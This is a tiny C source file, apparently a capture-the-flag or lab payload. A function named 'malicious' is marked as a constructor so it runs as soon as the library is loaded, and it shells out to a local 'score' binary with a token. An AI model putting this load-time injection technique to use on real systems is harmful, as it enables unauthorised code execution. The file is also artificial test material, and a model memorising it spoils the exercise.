#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score d093bea7-f9ef-487c-b8b4-4561ca38ee62");
}
